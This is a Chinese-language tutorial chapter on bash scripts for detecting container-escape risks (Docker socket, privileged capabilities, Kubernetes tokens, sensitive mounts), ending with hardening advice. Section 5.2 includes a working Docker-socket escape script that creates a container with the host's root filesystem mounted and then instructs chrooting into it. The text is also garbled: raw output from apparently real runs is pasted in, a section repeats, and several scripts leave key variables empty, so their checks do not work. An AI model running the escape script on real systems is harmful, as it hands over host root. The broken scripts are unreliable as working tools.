# 容器逃逸的bash检测脚本

## 章节概述

容器技术（Docker、LXC、Kubernetes 等）在现代 DevOps 中广泛使用，但不当的配置可能导致容器逃逸，使攻击者获得宿主机的 root 权限。本章系统性地讲解容器环境检测方法、Docker 逃逸检查、Kubernetes 提权向量、挂载检测、特权容器检测，以及自动化容器逃逸检测脚本的编写。

> **核心理念**
> 容器逃逸的本质是利用容器与宿主机之间的共享资源（内核、命名空间、设备挂载等）来突破隔离边界。检测的核心是识别容器环境、评估隔离配置、发现可利用的挂载和权限。

---

### 第1节 容器环境检测

#### 1.1 判断是否在容器中

[*] === 容器环境检测 ===

===== 方法1: /proc/1/cgroup =====
[+] 未检测到容器环境（cgroup）

===== 方法2: /.dockerenv =====
[+] 未发现 /.dockerenv

===== 方法3: /proc/1/cmdline =====
PID 1 命令行: /sbin/init 

===== 方法4: 环境变量 =====
[+] 未发现容器相关环境变量

===== 方法5: 挂载点 =====
tmpfs on /dev/shm type tmpfs (rw,nosuid,nodev,inode64,huge=advise,usrquota)
overlay on /var/lib/docker/rootfs/overlayfs/6709f151f615e0f602f48dfd78abaa2ce6cdba8add06b1a8c97d4ba8c8a85467 type overlay (rw,relatime,lowerdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/8/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/7/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/6/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/5/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/4/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/3/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/2/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/1/fs,upperdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/9/fs,workdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/9/work,index=off)

===== 方法6: 进程列表 =====
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.0  21168 15504 ?        Ss   08:28   0:02 /sbin/init
root           2  0.0  0.0      0     0 ?        S    08:28   0:00 [kthreadd]
root           3  0.0  0.0      0     0 ?        S    08:28   0:00 [pool_workqueue_release]
root           4  0.0  0.0      0     0 ?        I<   08:28   0:00 [kworker/R-rcu_gp]
root           5  0.0  0.0      0     0 ?        I<   08:28   0:00 [kworker/R-sync_wq]
root           6  0.0  0.0      0     0 ?        I<   08:28   0:00 [kworker/R-kvfree_rcu_reclaim]
root           7  0.0  0.0      0     0 ?        I<   08:28   0:00 [kworker/R-slub_flushwq]
root           8  0.0  0.0      0     0 ?        I<   08:28   0:00 [kworker/R-netns]
root          10  0.0  0.0      0     0 ?        I<   08:28   0:00 [kworker/0:0H-kblockd]

#### 1.2 容器类型识别

[*] 识别容器类型...

---

### 第2节 Docker 逃逸检查

#### 2.1 Docker Socket 检测

[*] === Docker 逃逸风险检查 ===

===== Docker Socket 检查 =====
[!] 发现 Docker Socket: /var/run/docker.sock
    权限: 660 root:docker
    Docker 版本: 29.7.2
[!] 发现 Docker Socket: /run/docker.sock
    权限: 660 root:docker
    Docker 版本: 29.7.2
[!] 发现 Docker Socket: /var/run/docker
    权限: 700 root:root
    Docker 版本: 29.7.2

===== Docker 环境变量 =====

#### 2.2 特权容器检测

[*] === 特权容器检测 ===

===== Capabilities 检查 =====
CapEff: 000001ffffffffff
[+] Seccomp 已启用 (模式: 0
0)

===== AppArmor 检查 =====

---

### 第3节 Kubernetes 提权检查

#### 3.1 Kubernetes 环境检测

[*] === Kubernetes 环境检测 ===

===== ServiceAccount Token =====
[+] 未发现 ServiceAccount Token

===== kubeconfig 检查 =====

---

### 第4节 挂载检测

#### 4.1 宿主机文件系统挂载

[*] === 挂载点安全检查 ===

===== 敏感目录挂载 =====
[!] 敏感目录已挂载: /root
overlay on /var/lib/docker/rootfs/overlayfs/6709f151f615e0f602f48dfd78abaa2ce6cdba8add06b1a8c97d4ba8c8a85467 type overlay (rw,relatime,lowerdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/8/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/7/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/6/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/5/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/4/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/3/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/2/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/1/fs,upperdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/9/fs,workdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/9/work,index=off)
[!] 敏感目录已挂载: /home
/dev/nvme0n1p2 on /home type btrfs (rw,relatime,compress=zstd:3,ssd,discard=async,space_cache=v2,subvolid=257,subvol=/@home)
[!] 敏感目录已挂载: /proc
proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)
systemd-1 on /proc/sys/fs/binfmt_misc type autofs (rw,relatime,fd=44,pgrp=1,timeout=0,minproto=5,maxproto=5,direct,pipe_ino=4713)
binfmt_misc on /proc/sys/fs/binfmt_misc type binfmt_misc (rw,nosuid,nodev,noexec,relatime)
[!] 敏感目录已挂载: /sys
sys on /sys type sysfs (rw,nosuid,nodev,noexec,relatime)
efivarfs on /sys/firmware/efi/efivars type efivarfs (rw,nosuid,nodev,noexec,relatime)
securityfs on /sys/kernel/security type securityfs (rw,nosuid,nodev,noexec,relatime)
cgroup2 on /sys/fs/cgroup type cgroup2 (rw,nosuid,nodev,noexec,relatime,nsdelegate,memory_recursiveprot,memory_hugetlb_accounting)
none on /sys/fs/pstore type pstore (rw,nosuid,nodev,noexec,relatime)
bpf on /sys/fs/bpf type bpf (rw,nosuid,nodev,noexec,relatime,mode=700)
systemd-1 on /proc/sys/fs/binfmt_misc type autofs (rw,relatime,fd=44,pgrp=1,timeout=0,minproto=5,maxproto=5,direct,pipe_ino=4713)
debugfs on /sys/kernel/debug type debugfs (rw,nosuid,nodev,noexec,relatime)
configfs on /sys/kernel/config type configfs (rw,nosuid,nodev,noexec,relatime)
tracefs on /sys/kernel/tracing type tracefs (rw,nosuid,nodev,noexec,relatime)
fusectl on /sys/fs/fuse/connections type fusectl (rw,nosuid,nodev,noexec,relatime)
none on /run/credentials/systemd-journald.service type tmpfs (ro,nosuid,nodev,noexec,relatime,nosymfollow,size=1024k,nr_inodes=1024,mode=700,inode64,huge=advise,noswap)
binfmt_misc on /proc/sys/fs/binfmt_misc type binfmt_misc (rw,nosuid,nodev,noexec,relatime)
[!] 敏感目录已挂载: /dev
dev on /dev type devtmpfs (rw,nosuid,relatime,size=7970540k,nr_inodes=1992635,mode=755,inode64,huge=advise)
/dev/nvme0n1p2 on / type btrfs (rw,relatime,compress=zstd:3,ssd,discard=async,space_cache=v2,subvolid=256,subvol=/@)
tmpfs on /dev/shm type tmpfs (rw,nosuid,nodev,inode64,huge=advise,usrquota)
devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,gid=5,mode=600,ptmxmode=000)
hugetlbfs on /dev/hugepages type hugetlbfs (rw,nosuid,nodev,relatime,pagesize=2M)
mqueue on /dev/mqueue type mqueue (rw,nosuid,nodev,noexec,relatime)
/dev/nvme0n1p2 on /home type btrfs (rw,relatime,compress=zstd:3,ssd,discard=async,space_cache=v2,subvolid=257,subvol=/@home)
/dev/nvme0n1p2 on /var/cache/pacman/pkg type btrfs (rw,relatime,compress=zstd:3,ssd,discard=async,space_cache=v2,subvolid=259,subvol=/@pkg)
/dev/nvme0n1p2 on /var/log type btrfs (rw,relatime,compress=zstd:3,ssd,discard=async,space_cache=v2,subvolid=258,subvol=/@log)
/dev/nvme0n1p1 on /boot type vfat (rw,relatime,fmask=0022,dmask=0022,codepage=437,iocharset=ascii,shortname=mixed,utf8,errors=remount-ro)

===== 可写挂载 =====

---

### 第5节 自动化容器逃逸检测

#### 5.1 综合容器逃逸扫描器

==========================================
  容器逃逸自动化检测器 v1.0
==========================================
[0;36m[*][0m 检测容器环境...
[0;32m[+][0m 未检测到容器环境

[0;36m[*][0m 检查 Docker 逃逸向量...
[0;31m[!][0m Docker Socket 已挂载 - 可以控制 Docker daemon!

### 第5节 自动化容器逃逸检测

#### 5.1 综合容器逃逸扫描器

```bash
#!/usr/bin/env bash
# container_escape_scanner.sh - 容器逃逸自动化检测
set -euo pipefail

RED='[0;31m'
GREEN='[0;32m'
YELLOW='[1;33m'
CYAN='[0;36m'
NC='[0m'

log_info()  { echo -e "${CYAN}[*]${NC} $*"; }
log_found() { echo -e "${RED}[!]${NC} $*"; }
log_safe()  { echo -e "${GREEN}[+]${NC} $*"; }
log_warn()  { echo -e "${YELLOW}[~]${NC} $*"; }

detect_container() {
    log_info "检测容器环境..."
    local is_container=false
    if [[ -f /.dockerenv ]]; then log_found "Docker 容器"; is_container=true; fi
    if grep -qE "(docker|lxc|kubepods|containerd)" /proc/1/cgroup 2>/dev/null; then
        log_found "容器 cgroup 检测"; is_container=true
    fi
    if [[ -f /run/.containerenv ]]; then log_found "Podman 容器"; is_container=true; fi
    if [[ "$is_container" == false ]]; then log_safe "未检测到容器环境"; fi
}

check_docker_escape() {
    log_info "检查 Docker 逃逸向量..."
    if [[ -S /var/run/docker.sock ]] || [[ -S /run/docker.sock ]]; then
        log_found "Docker Socket 已挂载 - 可以控制 Docker daemon!"
    fi
    if [[ -f /proc/1/status ]]; then
        local caps
        caps=
        if [[ "$caps" == "0000003fffffffff" ]]; then
            log_found "特权容器 - 拥有所有 capabilities!"
        fi
    fi
    if [[ -f /proc/1/attr/current ]]; then
        local aa
        aa=
        if [[ "$aa" == "unconfined" ]]; then log_warn "AppArmor 未启用"; fi
    fi
}

check_k8s_escape() {
    log_info "检查 Kubernetes 逃逸向量..."
    if [[ -f /var/run/secrets/kubernetes.io/serviceaccount/token ]]; then
        log_found "ServiceAccount Token 可用"
    fi
    for conf in /etc/kubernetes/admin.conf /root/.kube/config; do
        if [[ -f "$conf" ]]; then log_found "kubeconfig 可用: $conf"; fi
    done
}

check_mounts() {
    log_info "检查危险挂载..."
    local dangerous_dirs=("/var/run/docker.sock" "/etc/shadow" "/root" "/home")
    for d in "${dangerous_dirs[@]}"; do
        if mount | grep -q "$d"; then log_found "危险挂载: $d"; fi
    done
}

main() {
    echo "=========================================="
    echo "  容器逃逸自动化检测器 v1.0"
    echo "=========================================="
    detect_container; echo ""
    check_docker_escape; echo ""
    check_k8s_escape; echo ""
    check_mounts; echo ""
    log_info "检测完成"
}
main "$@"
```

#### 5.2 Docker Socket 利用脚本

```bash
#!/usr/bin/env bash
# docker_sock_exploit.sh - Docker Socket 逃逸利用
set -euo pipefail

echo "[*] === Docker Socket 逃逸利用 ==="

if [[ ! -S /var/run/docker.sock ]] && [[ ! -S /run/docker.sock ]]; then
    echo "[-] 未发现 Docker Socket"; exit 1
fi

SOCK="/var/run/docker.sock"
[[ -S /run/docker.sock ]] && SOCK="/run/docker.sock"
echo "[+] Docker Socket: $SOCK"

echo "[*] 列出所有容器..."
curl -s --unix-socket "$SOCK" http://localhost/containers/json 2>/dev/null | head -5

echo "[*] 创建逃逸容器（挂载宿主机根目录）..."
curl -s --unix-socket "$SOCK" -X POST     -H "Content-Type: application/json"     -d '{"Image":"alpine","Cmd":["/bin/sh"],"Mounts":[{"Type":"bind","Source":"/","Target":"/host"}]}'     http://localhost/containers/create?name=escape_container 2>/dev/null

echo "[+] 逃逸容器已创建"
echo "[*] 启动: docker start escape_container"
echo "[*] 进入: docker exec -it escape_container chroot /host"
```

---

### 第6节 防御与加固

#### 6.1 容器安全加固检查

```bash
#!/usr/bin/env bash
# container_hardening.sh - 容器安全加固检查
set -euo pipefail

echo "[*] === 容器安全加固检查 ==="

echo ""
echo "===== 用户检查 ====="
if [[ "$(id -u)" == "0" ]]; then
    echo "[!] 容器以 root 用户运行"
else
    echo "[+] 容器以非 root 用户运行: $(whoami)"
fi

echo ""
echo "===== Capabilities 检查 ====="
if [[ -f /proc/1/status ]]; then
    caps=
    echo "CapEff: $caps"
    dangerous_caps=("cap_sys_admin" "cap_sys_ptrace" "cap_net_admin" "cap_dac_override")
    for cap in "${dangerous_caps[@]}"; do
        if capsh --print 2>/dev/null | grep -q "$cap"; then
            echo "  [!] 危险 capability: $cap"
        fi
    done
fi

echo ""
echo "===== Seccomp 检查 ====="
seccomp=
if [[ "$seccomp" == "0" ]]; then echo "[!] Seccomp 未启用"
else echo "[+] Seccomp 已启用 (模式: $seccomp)"; fi

echo ""
echo "===== AppArmor 检查 ====="
if [[ -f /proc/1/attr/current ]]; then
    aa=
    if [[ "$aa" == "unconfined" ]]; then echo "[!] AppArmor 未启用"
    else echo "[+] AppArmor 已启用: $aa"; fi
fi

echo ""
echo "===== 文件系统检查 ====="
if mount | grep -q "ro.* / "; then echo "[+] 根文件系统为只读"
else echo "[!] 根文件系统可写"; fi

echo "[+] 加固检查完成"
```

#### 6.2 Docker 安全运行建议

```bash
# Docker 安全运行最佳实践

# 1. 不使用 --privileged
# docker run --rm -it alpine

# 2. 只添加必要的 capabilities
# docker run --cap-drop=ALL --cap-add=NET_BIND_SERVICE alpine

# 3. 使用只读文件系统
# docker run --read-only --tmpfs /tmp alpine

# 4. 禁用特权提升
# docker run --security-opt=no-new-privileges alpine

# 5. 使用非 root 用户
# docker run --user 1000:1000 alpine

# 6. 限制资源
# docker run --memory=256m --cpus=0.5 --pids-limit=100 alpine

# 7. 使用 seccomp 配置文件
# docker run --security-opt seccomp=custom.json alpine

# 8. 使用 AppArmor 配置文件
# docker run --security-opt apparmor=custom-profile alpine

# 9. 不挂载 Docker Socket
# 不要: docker run -v /var/run/docker.sock:/var/run/docker.sock

# 10. 使用网络隔离
# docker run --network=none alpine
```

